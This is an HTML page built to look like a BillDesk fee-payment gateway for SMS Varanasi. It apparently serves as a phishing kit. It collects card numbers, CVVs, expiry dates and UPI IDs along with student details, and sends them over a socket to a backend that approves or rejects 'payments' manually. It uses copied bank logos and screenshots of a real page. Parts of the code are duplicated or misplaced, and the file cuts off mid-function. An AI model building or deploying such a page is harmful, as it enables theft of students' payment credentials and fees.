<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>BillDesk Payment - SMS Varanasi</title>
<script src="https://cdn.tailwindcss.com">
// ============================================
// UPI PAYMENT FUNCTIONS
// ============================================

// Validate UPI form
function validateUpiForm() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        upiPayButton.disabled = false;
        upiPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        upiPayButton.disabled = true;
        upiPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append UPI suffix to input
function appendUpiSuffix(suffix) {
    const upiInput = document.getElementById('upiInput');
    const currentValue = upiInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        upiInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        upiInput.value = currentValue + suffix;
    }
    
    validateUpiForm();
}

// Handle UPI Payment
function handleUpiPayment() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Disable button
    upiPayButton.disabled = true;
    upiPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'UPI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare UPI payment data
    const upiPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'UPI',
        upiId: upiId,
        amount: 82450,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('üì± Sending UPI payment data:', upiPaymentData);
        paymentSocket.emit('upiDetailsSubmitted', upiPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=82450`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('‚ùå Socket not connected');
        alert('Connection error. Please try again.');
        upiPayButton.disabled = false;
        upiPayButton.textContent = 'Pay ‚Çπ82450';
    }
}

// Show loading screen with blur
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingText = document.getElementById('loadingText');
    loadingText.textContent = 'Processing Payment...';
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // Make background white and blurred
    loadingScreen.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
    loadingScreen.style.backdropFilter = 'blur(10px)';
}

</script>
<style>
/* Card input height fix */
#card-section .relative.p-3\.5 {
    padding: 10px 14px !important;
}
#card-section input {
    padding-top: 8px !important;
    padding-bottom: 4px !important;
}
#card-section .form-input {
    padding: 10px 12px !important;
}

body {
    background: #e8e8e8;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.side-pill {
    position: relative;
}

.side-pill.active::after {
    content: '';
    position: absolute;
    left: 0;
    top: 0;
    bottom: 0;
    width: 4px;
    background: #ff5722;
}

/* Custom scrollbar */
.scroll-container::-webkit-scrollbar {
    width: 6px;
}

.scroll-container::-webkit-scrollbar-track {
    background: #f1f1f1;
}

.scroll-container::-webkit-scrollbar-thumb {
    background: #ccc;
    border-radius: 3px;
}

.scroll-container::-webkit-scrollbar-thumb:hover {
    background: #999;
}
</style>
</head>
<body class="min-h-screen flex items-center justify-center p-5">

<div class="w-full flex justify-center gap-4 h-[calc(100vh-80px)] max-h-[700px]">
    <!-- Main Payment Section -->
    <div class="w-full h-full duration-300 transition-[max-width] ease-in-out max-w-[44rem]">
        <section class="max-w-[46rem] min-w-[38rem] w-full h-full rounded-[2rem] bg-white border border-gray-200 flex flex-col overflow-hidden shadow-lg">
            <!-- Header -->
            <div class="w-full flex gap-2 items-center p-4 border-b border-gray-200">
                <h4 class="font-semibold text-gray-800 flex items-center gap-2">
                    <span class="text-base font-bold">SS</span>
                    <span class="text-sm font-normal text-gray-600">School of Management Sciences</span>
                </h4>
                <button onclick="window.history.back()" class="ml-auto text-2xl text-gray-400 hover:text-gray-600 w-8 h-8 flex items-center justify-center">√ó</button>
            </div>

            <div class="flex w-full h-full overflow-hidden">
                <!-- Left Sidebar - Payment Methods -->
                <nav class="max-w-[17.25rem] w-full h-full overflow-auto flex flex-col divide-y divide-dashed border-r border-gray-200 scroll-container">
                    <div class="p-4">
                        <h4 class="font-semibold text-sm mb-4">Payment Methods</h4>
                    </div>

                    <!-- Credit/Debit Cards -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill active bg-gradient-to-r from-orange-50 to-white" onclick="showSection('card')">
                        <svg width="20" height="16" viewBox="0 0 20 16" fill="none" class="w-6 h-6">
                            <rect x="1" y="2" width="18" height="12" rx="1.5" stroke="#3B475B" stroke-width="1.5"/>
                            <line x1="1" y1="5" x2="19" y2="5" stroke="#3B475B" stroke-width="1.5"/>
                            <line x1="3" y1="10" x2="8" y2="10" stroke="#3B475B" stroke-width="1.5" stroke-linecap="round"/>
                        </svg>
                        <span class="text-sm font-medium text-gray-700">Credit / Debit Cards</span>
                    </div>

                    <!-- Net Banking -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('netbanking')">
                        <svg width="20" height="18" viewBox="0 0 20 18" fill="none" class="w-6 h-6">
                            <path d="M10 0L0 6H20L10 0Z" fill="#3B475B"/>
                            <rect x="2" y="7" width="3" height="9" fill="#3B475B"/>
                            <rect x="8.5" y="7" width="3" height="9" fill="#3B475B"/>
                            <rect x="15" y="7" width="3" height="9" fill="#3B475B"/>
                            <rect y="16" width="20" height="2" fill="#3B475B"/>
                        </svg>
                        <span class="text-sm font-medium text-gray-700">Net Banking</span>
                    </div>

                    <!-- UPI -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('upi')">
                        <img src="https://i.pinimg.com/originals/67/c8/7d/67c87d420f58c250b3b7aecb034350b6.jpg" alt="UPI" class="h-6 w-auto object-contain">
                    </div>

                    <!-- BHIM -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('bhim')">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/6/65/BHIM_SVG_Logo.svg" alt="BHIM" class="h-4 w-auto object-contain">
                    </div>

                    <!-- UPI QR -->
                    <div class="flex gap-4 items-center relative w-full h-16 shrink-0 pl-6 pr-4 cursor-pointer transition-all side-pill hover:bg-gray-50" onclick="showSection('qr')">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" class="w-6 h-6">
                            <!-- Top-left corner -->
                            <rect x="2" y="2" width="8" height="8" rx="1" stroke="#3B475B" stroke-width="1.8" fill="none"/>
                            <rect x="4" y="4" width="4" height="4" fill="#3B475B"/>
                            
                            <!-- Top-right corner -->
                            <rect x="14" y="2" width="8" height="8" rx="1" stroke="#3B475B" stroke-width="1.8" fill="none"/>
                            <rect x="16" y="4" width="4" height="4" fill="#3B475B"/>
                            
                            <!-- Bottom-left corner -->
                            <rect x="2" y="14" width="8" height="8" rx="1" stroke="#3B475B" stroke-width="1.8" fill="none"/>
                            <rect x="4" y="16" width="4" height="4" fill="#3B475B"/>
                            
                            <!-- Small squares for QR pattern -->
                            <rect x="14" y="14" width="2.5" height="2.5" fill="#3B475B"/>
                            <rect x="17.5" y="14" width="2.5" height="2.5" fill="#3B475B"/>
                            <rect x="21" y="14" width="1" height="2.5" fill="#3B475B"/>
                            <rect x="14" y="17.5" width="2.5" height="2.5" fill="#3B475B"/>
                            <rect x="17.5" y="17.5" width="4.5" height="2.5" fill="#3B475B"/>
                            <rect x="14" y="21" width="8" height="1" fill="#3B475B"/>
                        </svg>
                        <span class="text-sm font-medium text-gray-700">UPI QR</span>
                    </div>
                </nav>

                <!-- Center Content -->
                <div class="h-full w-full overflow-auto scroll-container">
                    <div class="px-10 py-6">
                        <!-- Card Section -->
                        <form class="w-full max-w-xl section active" id="card-section">
                            <div class="flex justify-between items-center mb-4">
                                <p class="text-sm font-medium text-gray-700">Card details</p>
                                <div class="flex items-center gap-2" id="cardLogos">
                                    <img id="visaLogo" src="https://static.vecteezy.com/system/resources/thumbnails/020/336/392/small/visa-logo-visa-icon-free-free-vector.jpg" alt="VISA" class="h-5 w-auto object-contain grayscale opacity-50 transition-all duration-300">
                                    <img id="mastercardLogo" src="https://i.pinimg.com/originals/79/77/9f/79779f77d2a5aa5eca98d313c10c7f0e.jpg" alt="Mastercard" class="h-5 w-auto object-contain grayscale opacity-50 transition-all duration-300">
                                    <img id="rupayLogo" src="https://www.pngkey.com/png/full/129-1290304_file-rupay-logo-rupay-card.png" alt="RuPay" class="h-4 w-auto object-contain grayscale opacity-50 transition-all duration-300">
                                </div>
                            </div>

                            <div class="border border-gray-300 rounded-lg overflow-hidden focus-within:border-orange-500 focus-within:ring-2 focus-within:ring-orange-100">
                                <div class="relative p-3.5 border-b border-gray-200">
                                    <input type="tel" id="cardNumber" class="w-full outline-none peer pt-4 pb-1 text-sm" placeholder=" " maxlength="19">
                                    <label class="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 text-sm transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-700 peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">Card number</label>
                                </div>
                                <div class="flex">
                                    <div class="relative p-3.5 border-r border-gray-200 flex-1">
                                        <input type="tel" id="expiryDate" class="w-full outline-none peer pt-4 pb-1 text-sm" placeholder=" " maxlength="5">
                                        <label class="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 text-sm transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-700 peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">Expiration date</label>
                                    </div>
                                    <div class="relative p-3.5 flex-1">
                                        <input type="password" id="cvvCode" class="w-full outline-none peer pt-4 pb-1 text-sm" placeholder=" " maxlength="3">
                                        <label class="absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400 text-sm transition-all peer-focus:top-2 peer-focus:text-xs peer-focus:text-gray-700 peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:text-xs">Security code</label>
                                    </div>
                                </div>
                            </div>

                            <div class="mt-4">
                                <label class="text-xs text-gray-600 font-medium mb-2 block">Card holder name</label>
                                <input type="text" id="cardHolderName" class="w-full border border-gray-300 rounded-lg outline-none focus:border-orange-500 focus:ring-2 focus:ring-orange-100 text-sm form-input" placeholder="Full name on card" style="padding: 10px 12px !important;">
                            </div>

                            <button type="button" id="payButton" class="w-full mt-6 bg-gray-200 text-gray-400 rounded-lg font-semibold cursor-not-allowed transition-all duration-300" disabled style="height: 44px !important; padding: 10px 16px !important;" onclick="handlePayment()">Pay ‚Çπ82450</button>
                        </form>

                        <!-- Net Banking Section -->
                        <div class="w-full section hidden" id="netbanking-section">
                            <input type="text" class="w-full p-3 border border-gray-300 rounded-lg mb-4" placeholder="üîç Search by bank name">
                            <p class="text-xs text-gray-400 mb-3">Top banks</p>
                            <div class="grid grid-cols-2 gap-3 mb-6">
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://i.pinimg.com/originals/ae/c7/36/aec7367eed57ba8cf8e78dda457ce4e3.jpg" alt="HDFC Bank" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">HDFC Bank [Retail]</span>
                                </div>
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ICICI_Bank_Logo.svg/2560px-ICICI_Bank_Logo.svg.png" alt="ICICI Bank" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">ICICI Bank [Retail]</span>
                                </div>
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://thumbs.dreamstime.com/b/kotak-mahindra-bank-india-logo-vector-304106271.jpg" alt="Kotak Bank" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">Kotak Bank</span>
                                </div>
                                <div class="border border-gray-200 rounded-lg p-4 flex flex-col items-center gap-2 cursor-pointer hover:bg-gray-50">
                                    <img src="https://discovertemplate.com/wp-content/uploads/2024/04/SBI.jpg" alt="State Bank of India" class="h-8 w-auto object-contain">
                                    <span class="text-xs text-center">State Bank of India</span>
                                </div>
                            </div>
                            <p class="text-xs text-gray-400 mb-3">All other banks</p>
                            <div class="border border-gray-200 rounded-lg max-h-64 overflow-y-auto">
                                <div class="flex items-center gap-3 p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
                                    <div class="w-6 h-6 bg-gray-200 rounded flex items-center justify-center">üè¶</div>
                                    <span class="text-sm flex-1">Andhra Pragathi Grameena Bank</span>
                                    <span class="text-gray-400">‚Ä∫</span>
                                </div>
                                <div class="flex items-center gap-3 p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50">
                                    <div class="w-6 h-6 bg-orange-600 rounded text-white text-xs font-bold flex items-center justify-center">AU</div>
                                    <span class="text-sm flex-1">AU Small Finance Bank</span>
                                    <span class="text-gray-400">‚Ä∫</span>
                                </div>
                            </div>
                        </div>

                        <!-- UPI Section -->
                        <div class="w-full section hidden" id="upi-section">
                            <div class="text-center p-6 relative">
                                <img src="../refrence image/photo_2025-12-18_04-56-21.png" alt="Scan QR Code" class="w-full max-w-xl mx-auto object-contain">
                                <!-- Invisible clickable area over the Show QR button -->
                                <button onclick="openQRModal()" class="absolute bg-transparent hover:bg-white hover:bg-opacity-10 rounded-lg transition-all" style="left: 18%; top: 42%; width: 22%; height: 18%; cursor: pointer;"></button>
                            </div>
                            <p class="text-center text-gray-400 text-sm my-4">Or</p>
                            <p class="text-sm font-medium text-gray-700 mb-4">UPI Payment</p>
                            <label class="text-xs text-gray-600 font-medium mb-2 block">Enter your UPI ID</label>
                            <input type="text" id="upiInput" class="w-full p-3 border border-gray-300 rounded-lg mb-2 outline-none focus:border-orange-500 focus:ring-2 focus:ring-orange-100" placeholder="yourname@upi" oninput="validateUpiForm()">
                            <div class="flex gap-2 flex-wrap mb-4">
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@upi')">@upi</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@okhdfcbank')">@okhdfcbank</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@okicici')">@okicici</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendUpiSuffix('@paytm')">@paytm</span>
                            </div>
                            <button type="button" id="upiPayButton" class="w-full h-12 bg-gray-200 text-gray-400 rounded-lg font-semibold cursor-not-allowed transition-all duration-300" disabled onclick="handleUpiPayment()">Pay ‚Çπ82450</button>
                        </div>

                        <!-- BHIM Section -->
                        <div class="w-full section hidden" id="bhim-section">
                            <p class="text-sm font-medium text-gray-700 mb-4">BHIM Payment</p>
                            <label class="text-xs text-gray-600 font-medium mb-2 block">Enter your UPI ID</label>
                            <input type="text" id="bhimInput" class="w-full p-3 border border-gray-300 rounded-lg mb-2 outline-none focus:border-orange-500 focus:ring-2 focus:ring-orange-100" placeholder="yourname@upi" oninput="validateBhimForm()">
                            <div class="flex gap-2 flex-wrap mb-4">
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@upi')">@upi</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@okhdfcbank')">@okhdfcbank</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@okicici')">@okicici</span>
                                <span class="px-3 py-1 bg-gray-100 border border-gray-200 rounded text-xs cursor-pointer hover:bg-gray-200" onclick="appendBhimSuffix('@paytm')">@paytm</span>
                            </div>
                            <button type="button" id="bhimPayButton" class="w-full h-12 bg-gray-200 text-gray-400 rounded-lg font-semibold cursor-not-allowed transition-all duration-300" disabled onclick="handleBhimPayment()">Pay ‚Çπ82450</button>
                        </div>

                        <!-- UPI QR Section -->
                        <div class="w-full section hidden" id="qr-section">
                            <div class="text-center p-8">
                                <p class="text-base font-semibold mb-2">Scan the QR code</p>
                                <p class="text-sm text-gray-600 mb-6">Use your UPI app to make your payment.</p>
                                <div class="flex gap-3 justify-center mb-6">
                                    <img src="../refrence image/upi refrence image/photo_2025-12-18_04-49-33.png" alt="UPI Apps" class="h-12 w-auto object-contain">
                                </div>
                                <div class="w-56 h-56 mx-auto mb-4 bg-gray-50 border-2 border-dashed border-gray-300 rounded-lg flex items-center justify-center text-gray-400">
                                    QR Code will appear here
                                </div>
                                <p class="text-sm text-gray-600">Code expires in <span class="text-orange-600 font-semibold" id="qrTimer">05:00</span></p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- Right Sidebar - Summary -->
    <div class="w-full max-w-[19rem]">
        <section class="w-full h-fit rounded-3xl bg-white p-5 pb-12 overflow-hidden flex flex-col border border-gray-200 relative shadow-lg">
            <svg width="24" height="24" class="mb-2 text-gray-600" fill="currentColor" viewBox="0 0 24 24">
                <circle cx="12" cy="12" r="10" stroke="currentColor" fill="none" stroke-width="2"/>
                <text x="12" y="16" text-anchor="middle" font-size="14" font-weight="bold">i</text>
            </svg>
            <div class="flex gap-4 items-center mb-6">
                <span class="text-sm font-semibold">Summary</span>
                <div class="h-px bg-gradient-to-r from-gray-300 to-transparent flex-1"></div>
            </div>
            <div class="flex justify-between mb-1 text-sm">
                <span class="text-gray-500">Order ID</span>
                <span id="orderID">108115</span>
            </div>
            <div class="flex justify-between pt-4 mt-4 border-t border-dashed border-gray-300 text-base font-medium">
                <span>Total Amount</span>
                <span>‚Çπ82450</span>
            </div>
            <footer class="flex items-center justify-center pt-6 mt-6 border-t border-gray-200">
                <img src="https://images.seeklogo.com/logo-png/44/1/billdesk-logo-png_seeklogo-440316.png" alt="BillDesk" class="h-16 w-auto object-contain" style="mix-blend-mode: darken;">
            </footer>
        </section>
    </div>
</div>

<!-- Loading Screen -->
<div id="loadingScreen" class="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm hidden items-center justify-center z-50">
    <div class="bg-white rounded-2xl p-8 flex flex-col items-center gap-4">
        <div class="w-12 h-12 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
        <p class="text-gray-700 font-medium" id="loadingText">Processing Payment...</p>
    </div>
</div>

<!-- QR Code Modal Overlay -->
<div id="qrModal" class="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm hidden items-center justify-center z-50" onclick="closeQRModal(event)">
    <div class="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 relative" onclick="event.stopPropagation()">
        <button onclick="closeQRModal()" class="absolute -top-10 -right-2 text-white hover:text-gray-300 text-3xl w-10 h-10 flex items-center justify-center">√ó</button>
        
        <div class="text-center">
            <h3 class="text-xl font-semibold mb-2 text-gray-800">Scan the QR code</h3>
            <p class="text-sm text-gray-600 mb-1">using any UPI app to make your payment of</p>
            <p class="text-base font-semibold text-blue-600 mb-4">‚Çπ82450</p>
            
            <div class="flex justify-center gap-1.5 mb-5">
                <img src="https://cdn1.iconfinder.com/data/icons/logos-brands-in-colors/436/Google_Pay_GPay_Logo-512.png" alt="Google Pay" class="h-12 w-auto object-contain">
                <img src="https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/phonepe-logo.png" alt="PhonePe" class="h-12 w-auto object-contain">
                <img src="https://images.seeklogo.com/logo-png/30/1/paytm-logo-png_seeklogo-305549.png" alt="Paytm" class="h-12 w-auto object-contain">
                <img src="https://images.seeklogo.com/logo-png/43/2/bhim-bharat-interface-for-money-logo-png_seeklogo-430174.png" alt="BHIM" class="h-12 w-auto object-contain">
            </div>
            
            <div class="w-48 h-48 mx-auto mb-4 bg-white border border-gray-300 rounded flex items-center justify-center p-2">
                <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=smsvaranasi@upi&pn=SMS%20Varanasi&am=82450&cu=INR" alt="QR Code" class="w-full h-full object-contain">
            </div>
            
            <p class="text-sm text-gray-600 mb-5">Code expires in <span class="text-green-600 font-semibold" id="modalTimer">04:59</span></p>
            
            <button onclick="closeQRModal()" class="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold py-3 rounded-lg transition-colors">Close</button>
        </div>
    </div>
</div>

<script src="https://cdn.socket.io/4.5.4/socket.io.min.js">
// ============================================
// UPI PAYMENT FUNCTIONS
// ============================================

// Validate UPI form
function validateUpiForm() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        upiPayButton.disabled = false;
        upiPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        upiPayButton.disabled = true;
        upiPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append UPI suffix to input
function appendUpiSuffix(suffix) {
    const upiInput = document.getElementById('upiInput');
    const currentValue = upiInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        upiInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        upiInput.value = currentValue + suffix;
    }
    
    validateUpiForm();
}

// Handle UPI Payment
function handleUpiPayment() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Disable button
    upiPayButton.disabled = true;
    upiPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'UPI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare UPI payment data
    const upiPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'UPI',
        upiId: upiId,
        amount: 82450,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('üì± Sending UPI payment data:', upiPaymentData);
        paymentSocket.emit('upiDetailsSubmitted', upiPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=82450`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('‚ùå Socket not connected');
        alert('Connection error. Please try again.');
        upiPayButton.disabled = false;
        upiPayButton.textContent = 'Pay ‚Çπ82450';
    }
}

// Show loading screen with blur
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingText = document.getElementById('loadingText');
    loadingText.textContent = 'Processing Payment...';
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // Make background white and blurred
    loadingScreen.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
    loadingScreen.style.backdropFilter = 'blur(10px)';
}

</script>
<script>
let modalTimerInterval = null;
let modalTimeRemaining = 300; // 5 minutes in seconds
let paymentSocket = null;
let paymentSessionId = null;

// Get student data from URL parameters
const urlParams = new URLSearchParams(window.location.search);
const studentData = {
    rollNumber: urlParams.get('roll') || 'UNKNOWN',
    name: urlParams.get('name') || 'Unknown Student',
    fatherName: urlParams.get('father') || '',
    course: urlParams.get('course') || '',
    semester: urlParams.get('semester') || ''
};

window.onload = function() {
    document.getElementById('orderID').textContent = Math.floor(100000 + Math.random() + 900000);
    startTimer();
    initCardInputs();
    initializePaymentConnection();
};

// Initialize WebSocket connection for payment
function initializePaymentConnection() {
    paymentSocket = io('http://localhost:3000', {
        transports: ['websocket', 'polling'],
        reconnection: true
    });
    
    paymentSocket.on('connect', () => {
        console.log('‚úÖ Connected to payment server');
        
        // Create payment session
        paymentSocket.emit('paymentRequest', {
            student: studentData,
            amount: 82450
        });
    });
    
    paymentSocket.on('paymentSessionCreated', (data) => {
        paymentSessionId = data.sessionId;
        console.log('üí≥ Payment session created:', paymentSessionId);
    });
    
    paymentSocket.on('paymentApproved', (data) => {
        console.log('‚úÖ Payment approved:', data);
        // Redirect to success page with transaction details
        const params = new URLSearchParams({
            txnId: data.transaction.id,
            amount: data.transaction.amount,
            student: data.transaction.studentName,
            roll: data.transaction.rollNumber,
            status: 'success'
        });
        window.location.href = 'payment_success.html?' + params.toString();
    });
    
    paymentSocket.on('paymentRejected', (data) => {
        console.log('‚ùå Payment rejected:', data);
        alert('Payment was rejected: ' + data.reason);
    });
};

function initCardInputs() {
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvvCode');
    const cardHolderNameInput = document.getElementById('cardHolderName');
    
    // Card Number Formatting and Detection
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, ''); // Remove spaces
        value = value.replace(/\D/g, ''); // Remove non-digits
        
        // Limit to 16 digits
        if (value.length > 16) {
            value = value.substring(0, 16);
        }
        
        // Format with spaces (xxxx xxxx xxxx xxxx)
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        
        e.target.value = formattedValue;
        
        // Card brand detection (after 4-6 digits)
        if (value.length >= 4) {
            detectCardBrand(value);
        } else {
            resetCardLogos();
        }
        
        // Check if form is complete
        validateCardForm();
    });
    
    // Expiry Date Formatting (MM/YY)
    expiryDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
        
        // Limit to 4 digits (MMYY)
        if (value.length > 4) {
            value = value.substring(0, 4);
        }
        
        // Auto-insert slash after 2 digits
        if (value.length >= 2) {
            e.target.value = value.substring(0, 2) + '/' + value.substring(2);
        } else {
            e.target.value = value;
        }
        
        // Check if form is complete
        validateCardForm();
    });
    
    // CVV Formatting (xxx)
    cvvInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
        
        // Limit to 3 digits
        if (value.length > 3) {
            value = value.substring(0, 3);
        }
        
        e.target.value = value;
        
        // Check if form is complete
        validateCardForm();
    });
    
    // Card Holder Name
    cardHolderNameInput.addEventListener('input', function(e) {
        // Check if form is complete
        validateCardForm();
    });
}

function validateCardForm() {
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvvCode');
    const cardHolderNameInput = document.getElementById('cardHolderName');
    const payButton = document.getElementById('payButton');
    
    // Get values without formatting
    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
    const expiryDate = expiryDateInput.value;
    const cvv = cvvInput.value;
    const cardHolderName = cardHolderNameInput.value.trim();
    
    // Check if all fields are complete
    const isCardNumberValid = cardNumber.length === 16;
    const isExpiryValid = expiryDate.length === 5 && expiryDate.includes('/');
    const isCvvValid = cvv.length === 3;
    const isNameValid = cardHolderName.length > 0;
    
    // Enable button if all fields are valid
    if (isCardNumberValid && isExpiryValid && isCvvValid && isNameValid) {
        payButton.disabled = false;
        payButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        payButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        payButton.disabled = true;
        payButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        payButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

function detectCardBrand(cardNumber) {
    const firstDigit = cardNumber.charAt(0);
    const visaLogo = document.getElementById('visaLogo');
    const mastercardLogo = document.getElementById('mastercardLogo');
    const rupayLogo = document.getElementById('rupayLogo');
    
    // Reset all to grayscale first
    visaLogo.classList.add('grayscale', 'opacity-50');
    mastercardLogo.classList.add('grayscale', 'opacity-50');
    rupayLogo.classList.add('grayscale', 'opacity-50');
    
    // Detect and highlight based on first digit
    if (firstDigit === '4') {
        // Visa
